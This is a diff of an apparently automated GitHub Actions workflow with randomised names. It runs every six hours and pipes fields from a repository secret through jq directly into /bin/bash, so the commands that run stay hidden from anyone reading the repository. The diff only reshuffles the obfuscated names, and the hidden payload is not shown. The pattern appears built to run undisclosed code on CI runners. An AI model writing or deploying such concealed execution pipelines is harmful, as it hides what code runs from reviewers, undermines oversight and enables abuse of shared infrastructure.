@@ -3,28 +3,25 @@ name: yuanjieling2038
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
-jobs:  # 14029
+    - cron: '7 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanjieling2038
         env:
-          htsy05: ${{ secrets.htsy05 }}
+          wzfp9: ${{ secrets.wzfp9 }}
         run: |
-          echo $htsy05 | jq -r .jyzd670 | /bin/bash
-          echo $ylejd1602 | jq -r .c83118 | /bin/bash
-          echo $aueou2 | jq -r .rz94 | /bin/bash
-          echo $aeb5 | jq -r .tbcoy241 | /bin/bash
-          echo $rvmj5 | jq -r .m81 | /bin/bash
-          echo $mr603 | jq -r .ba96 | /bin/bash
-          echo $m13 | jq -r .xufc18 | /bin/bash
-          echo $wd6 | jq -r .dlu15 | /bin/bash
-          echo $hgst6 | jq -r .nej778 | /bin/bash
-          echo $kaxh2512 | jq -r .eejnc3691 | /bin/bash
-          echo $qtza3 | jq -r .hwstr20 | /bin/bash
-          echo $twt13 | jq -r .j403 | /bin/bash
-          echo $gp5665 | jq -r .wkfb540 | /bin/bash
-          echo $fiq726 | jq -r .y7 | /bin/bash
+          echo $wzfp9 | jq -r .eccig9739 | /bin/bash
+          echo $fqiz07201 | jq -r .xslpw4112 | /bin/bash
+          echo $itsm0671 | jq -r .yi832 | /bin/bash
+          echo $zugq93 | jq -r .let98 | /bin/bash
+          echo $mxxuq55882 | jq -r .pmaz57388 | /bin/bash
+          echo $gvkup1 | jq -r .kswc31671 | /bin/bash
+          echo $uxq43563 | jq -r .n6188 | /bin/bash
+          echo $eahjj96828 | jq -r .ejaj0242 | /bin/bash
+          echo $o80808 | jq -r .ogn82941 | /bin/bash
+          echo $gybum0 | jq -r .ld81 | /bin/bash
 
